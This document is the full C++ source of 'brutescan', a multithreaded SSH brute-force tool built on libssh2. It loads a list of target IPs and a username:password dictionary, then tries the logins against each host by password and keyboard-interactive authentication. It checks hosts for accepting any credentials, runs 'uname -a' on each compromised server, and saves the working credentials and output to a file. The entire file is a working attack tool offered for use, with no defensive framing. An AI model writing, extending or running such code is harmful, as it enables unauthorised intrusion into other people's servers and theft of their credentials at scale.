/*
build command:
g++ --std=c++11 sshbrute.cpp -o sshbrute -pthread -I /usr/local/include/ -lssh2  -L /usr/local/lib
*/
#include<fstream>
#include<iostream>
#include<string>
#include<vector>
#include<map>
#include<cstdint>
#include<cctype>
#include <thread> 
#include <mutex> 

#define _GNU_SOURCE
#include <fcntl.h>
#include <errno.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sched.h>

/* plog util, URL: https://github.com/SergiusTheBest/plog */
#include <plog/Log.h>

/* getoptpp util, namespace GetOpt, URL: https://github.com/timstaley/getoptpp */
#include <getoptpp/getopt_pp_standalone.h> 

/* libssh2, URL: https://www.libssh2.org/ */
#include <libssh2.h> 

#define OP_TIMEO_SEC 6
#define DEFAULT_PORT 22

enum AUTH_RESULT { ERR_CONNECT = -1, AUTH_OK = 0, ERR_USERNAME, ERR_PASSWORD};

using namespace std;

class IPAddr {
public:
	uint32_t ip;
	uint16_t port;
	string str;
};


static int set_cpu(uint32_t core)
{
	cpu_set_t cpuset;
	CPU_ZERO(&cpuset);
	CPU_SET(core, &cpuset);

	if (pthread_setaffinity_np(pthread_self(),
				sizeof(cpu_set_t), &cpuset) != 0) {
		return 1;
	}
	return 0;
}

vector<IPAddr> LoadTarget(string infile)
{
	vector<IPAddr> v;
	ifstream ifs(infile);
	if(!ifs.is_open()) {
		LOGE  << "ERR:1: open file `" << infile << " failed.";
		return v;
	}
	while(!ifs.eof()) {
		int port = 0;
		char line[1024];
		line[0] = '\0';
		ifs.getline(line, sizeof(line));
		char *p = line;
		while(*p && isspace(*p)) { p++; }
		char *s = p;
		while(*p && *p!=',') { p++; }
		if(*p) {
			*p='\0'; p++;
			if(*p){
				char *q = NULL;
				port = strtol(p, &q, 10);
			}
		}
		if(*s) {
			struct in_addr ip;
			if(inet_aton(s, &ip)) {
				IPAddr addr;
				if(port==0) {
					port = DEFAULT_PORT;
				}
				addr.ip = ip.s_addr;
				addr.port = htons(port);
				char str[24];
				int n = sprintf(str, "%s,%d", s, port);
				addr.str = string(str, n);
				v.push_back(addr);
			}
		} else {
			continue;
		}
	}
	ifs.close();
	LOGD << "LOAD " << v.size() << " targets.";
	return v;
}

map<string, vector<string>> LoadDictionary(string infile)
{
	map<string, vector<string>> m;
	ifstream ifs(infile);
	if(!ifs.is_open()) {
		LOGE << "ERR:2: open file `" << infile << " failed.";
		return m;
	}
	while(!ifs.eof()) {
		char line[1024];
		line[0] = '\0';
		ifs.getline(line, sizeof(line));
		char *p = line;
		while(*p && isspace(*p)) { p++; }
		char *s = p;
		while(*p && *p!=':') { p++; }
		if(!*s || !*p) {//
			continue;
		}
		*p='\0';
		p++;
		string username(s), password(p);
		map<string, vector<string>>::iterator it = m.find(username);
		if(it==m.end()) {
			m[username] = vector<string>(1, password);
		} else {
			it->second.push_back(password);
		}
	}
	ifs.close();
	LOGD << "LOAD " << m.size() << " dictionary entries.";
	return m;
}

void ShowUsage(string progname, string appname)
{
	string delim("\n\t\t\t");
	cout << "Usage: " << progname << " [options] ..." << endl;
	cout << "\n" << appname << "\n" << endl;
	cout << "Options:" << endl;
	cout << "  -h, --help\t\tshow this help message and exit" << endl;
	cout << "  -i INFILE, --infile=INFILE" << delim << "load targets from FILE" << endl;
	cout << "  -d DICTFILE, --dictfile=DICTFILE" << delim << "load dictionary from FILE" << endl;
	cout << "  -o OUTFILE, --outfile=OUTFILE" << delim << "save result to FILE" << endl;
	cout << "  -l LOGFILE, --logfile=LOGFILE" << delim << "logging to this FILE" << endl;
	cout << "  -t THREADS, --threads=THREADS" << delim << "bruting with n THREADS" << endl;
}

thread_local const string *current_password;
static void kbd_callback(const char *name, int name_len,
                         const char *instruction, int instruction_len,
                         int num_prompts,
                         const LIBSSH2_USERAUTH_KBDINT_PROMPT *prompts,
                         LIBSSH2_USERAUTH_KBDINT_RESPONSE *responses,
                         void **abstract)
{
	size_t length = current_password->length();
	char *password = (char *)malloc(length+1);
	memcpy(password, current_password->data(), length);
	
    (void)name;
    (void)name_len;
    (void)instruction;
    (void)instruction_len;
    if (num_prompts == 1) {
        responses[0].text = password;
        responses[0].length = length;
    }
    (void)prompts;
    (void)abstract;
} /* kbd_callback */ 


#define CMDLINE "uname -a"
int SshTryLogin(const IPAddr& addr, const string& username, const string& password, string& ostr)
{
	int s = socket(AF_INET, SOCK_STREAM, 0);
	struct sockaddr_in sin;
	sin.sin_family = AF_INET;
	sin.sin_addr.s_addr = addr.ip;
	sin.sin_port = addr.port;
	
    struct timeval timeout;      
    timeout.tv_sec = OP_TIMEO_SEC;
    timeout.tv_usec = 0;
	
    setsockopt (s, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));
	setsockopt (s, SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof(timeout));
    if(connect(s, (struct sockaddr*)(&sin), sizeof(struct sockaddr_in)) != 0) 
	{
		LOGD << "[ECONN] " << addr.str;
		close(s);
		return ERR_CONNECT;	
	}
	
	int retval = ERR_CONNECT;
	char *userauthlist = NULL;
	LIBSSH2_SESSION *session = libssh2_session_init();
	libssh2_session_set_timeout(session, (OP_TIMEO_SEC+3) * 1000);
	LIBSSH2_CHANNEL *channel = NULL;
	if (libssh2_session_handshake(session, s) != 0)
	{
		LOGD << "[EHAND] " << addr.str;
		retval = ERR_CONNECT;
		goto SHUTDOWN;	
    }
	
	userauthlist = libssh2_userauth_list(session, username.data(), username.length());
	if(!userauthlist) {
		if(libssh2_userauth_authenticated(session)) {
			retval = AUTH_OK;
			ostr = "?<IPHONE>?";
		} else {
			LOGD << "[EAUTH] NULL@" << addr.str;
		}
		goto SHUTDOWN;
	}
	
	if(userauthlist && strstr(userauthlist, "password") != NULL) 
	{
		if (libssh2_userauth_password(session, username.c_str(), password.c_str())==0) 
		{
			//LOGI << "[FOUND] " << username << "," << password << "@" << addr.str;
			retval = AUTH_OK;
		} else {
			retval = ERR_PASSWORD;
			goto SHUTDOWN;
		}
	} else if(userauthlist && strstr(userauthlist, "keyboard-interactive") != NULL) {
		current_password = &password;//needed by kbd_callback
		if (libssh2_userauth_keyboard_interactive(session, username.c_str(), &kbd_callback) == 0) 
		{
            //LOGI << "[FOUND] " << username << "," << password << "@" << addr.str;
			retval = AUTH_OK;
        } else {
            retval = ERR_PASSWORD;
			goto SHUTDOWN;
        }
	} else {
		LOGD << "[EUSER] " << username << "@" << addr.str;
		retval = ERR_USERNAME;
		goto SHUTDOWN;	
	}
	
	channel = libssh2_channel_open_session(session);
	if(!channel) 
	{
		LOGD << "[ECHANN] " << username << "," << password << "@" << addr.str;
		goto SHUTDOWN;
	}
	
	if(libssh2_channel_exec(channel, CMDLINE)==0)
	{
		static const char *hex="0123456789abcdef";
		char buffer[1024];
		int retval = libssh2_channel_read(channel, buffer, sizeof(buffer)-1);
		if(retval>=0) {
			buffer[retval] = '\0';
			if(strstr(buffer, "Authorization failed")!=NULL) {
				LOGD << "[EAUTHOR] " << username << "," << password << "@" << addr.str << ":" << buffer;
				retval = ERR_USERNAME;
				goto SHUTDOWN;	
			}
			for(char *p = buffer; p<buffer+retval; ++p) {
				unsigned char c = *(unsigned char *)p;
				if(c>=0x20 && c<0x7f && c!=',') {
					ostr += *p;
				} else if(*p=='\n') ostr+="\\n";
				else if(*p=='\t') ostr+="\\t";
				else if(*p=='\r') ostr+="\\r";
				else if(*p=='\\') {ostr+= "\\"; ostr+=*p;}
				else if(*p==',') {ostr+="\\,";}
				else { 
				    ostr+="\\x"+hex[(c>>4)&0x0f];
					ostr+=hex[c&0x0f];
				}
			}
		}
	}
	//goto SHUTDOWN;
SHUTDOWN:
	if (channel) 
	{
        libssh2_channel_free(channel);
        channel = NULL;
    }
	if(session)
	{
		libssh2_session_disconnect(session, "BYE!BYE!");
		libssh2_session_free(session);
	}
	close(s);
	return retval;
}

class SshBrute {
private:
	mutex m_mtx;
	int m_idx = 0;
	int m_cpuid = 0;
	int num_cores = 1;
	bool m_stop = false;
	const vector<IPAddr> *m_addr = NULL;
	const map<string, vector<string>> *m_userpasswd = NULL;
	ofstream m_ofs;
public:
	
	int Init(const vector<IPAddr> *v, const map<string, vector<string>> *m, const string& outfile)
	{
		m_idx = 0;
		m_cpuid = 0;
		m_addr = v;
		m_userpasswd = m;
		num_cores = sysconf(_SC_NPROCESSORS_ONLN);
		libssh2_init (0);
		m_ofs.open(outfile, ios_base::out|ios_base::trunc);
		if(v->size()==0 || m->size()==0 || !m_ofs.is_open()) 
			return -1;
		return 0;
	}
	
	int Stop()
	{
		libssh2_exit();
		m_ofs.close();
	}
	
	void SaveResult(const IPAddr* addr, const string& username, const string &password,  const string& ostr)
	{
		m_mtx.lock();
		m_ofs << addr->str << ","  << username << ","  << password << "," << ostr << endl;
		m_mtx.unlock();
	}
	
	int PreTest(const IPAddr* addr)
	{
		static string username = "Sji2wjJOZ"; //random string
		static string password = "UQI90sdHS"; //random password
		string ostr = "";
		int retval = SshTryLogin(*addr, username, password, ostr);
		if(retval==ERR_CONNECT)
			return -1;
		if(retval==AUTH_OK) {
			LOGI << "[FOUND] " << "<ANY>,<ANY>" << "@" << addr->str;
			SaveResult(addr,string("<ANY>"),string("<ANY>"),ostr);
			return 1;
		}
		return 0;
	}
	
	void RunJob(const IPAddr* addr)
	{
		if(PreTest(addr) != 0)
			return ;
		
		int found = 0;
		bool conn_ok = true;
		map<string, vector<string>>::const_iterator it = m_userpasswd->begin();
		while(it!=m_userpasswd->end() && conn_ok) 
		{
			vector<string>::const_iterator iv = it->second.begin();
			while(iv != it->second.end()) 
			{
				string ostr = "";
				int retval = SshTryLogin(*addr, it->first, *iv, ostr);
				if(retval==ERR_CONNECT) {
					//connection error					
					conn_ok = false;
					break;
				}
				
				if(retval==AUTH_OK) {//found
					LOGI << "[FOUND] " << it->first << "," << *iv << "@" << addr->str;
					//and save result
					found ++;
					SaveResult(addr, it->first, *iv, ostr);
					break;
				}
				if(retval==ERR_USERNAME) {
					break;//try next username
				}
				//retval==ERR_USERNAME: continue
				iv++;
			}
			it++;
		}
		if(found==0 && conn_ok) {
			LOGD << "[SAFE] @" << addr->str;
		}
	}
	
	void Thread()
	{
		int cpuid = 0;
		m_mtx.lock();
		cpuid = (m_cpuid++)%num_cores;
		m_mtx.unlock();
		set_cpu(cpuid);
		while(!m_stop) {
			m_mtx.lock();
			const IPAddr* addr = &((*m_addr)[m_idx]);
			m_idx++;
			if(m_idx>=m_addr->size()) {
				m_stop = true;
			}
			m_mtx.unlock();
			RunJob(addr);
		}
	}
	
	int Run(int nworkers)
	{
		vector<thread> threads;
		int i;
		for(i=0; i<nworkers; i++)
		{
			threads.push_back(thread(&SshBrute::Thread, this));
		}
		LOGD << nworkers << " threads started.";
		
		for(i=0; i<nworkers; i++)
		{
			threads[i].join();
		}
		LOGD << nworkers << " threads finished.";
		return 0;
	}
};


int main(int argc, char *argv[])
{
	string progname(argv[0]), appname("brutescan v1.0.0");
	GetOpt::GetOpt_pp ops(argc, argv);
	string infile,dictfile,outfile,logfile;
	int nthreads = 1;
	ops.exceptions(ios::failbit | ios::eofbit);
	try {
		if(argc==1 || ops >> GetOpt::OptionPresent('h', "help")) {
			ShowUsage(progname, appname);
			return 0;
		}
		ops >> GetOpt::Option('i', "infile", infile); 
		ops >> GetOpt::Option('d', "dictfile", dictfile);
		ops >> GetOpt::Option('o', "outfile", outfile); 
		ops >> GetOpt::Option('l', "logfile", logfile); 
		ops >> GetOpt::Option('t', "threads", nthreads);
		//cout << "OPTIONS:[" << infile << "|" << dictfile << "|" << outfile << "|" << logfile << "]\n";
		plog::init(plog::debug, logfile.c_str());
		LOGI << "OPTIONS:[" << infile << "|" << dictfile << "|" << outfile << "|" << logfile << "|"  << nthreads << "]";
		LOGD << "LET US DANCE";
		
	} catch(GetOpt::GetOptEx ex) {
		cerr << "*ERR: invalid/missing argument.Please check your input.";
		ShowUsage(progname, appname);
		return 1;
	}
	
	vector<IPAddr> v = LoadTarget(infile);
	map<string, vector<string>> m = LoadDictionary(dictfile);
	
	SshBrute brute;
	if(brute.Init(&v, &m, outfile)!=0){
		LOGE << "SshBrute::Init failed.";
		return 2;
	}
	brute.Run(nthreads);
	return 0;
}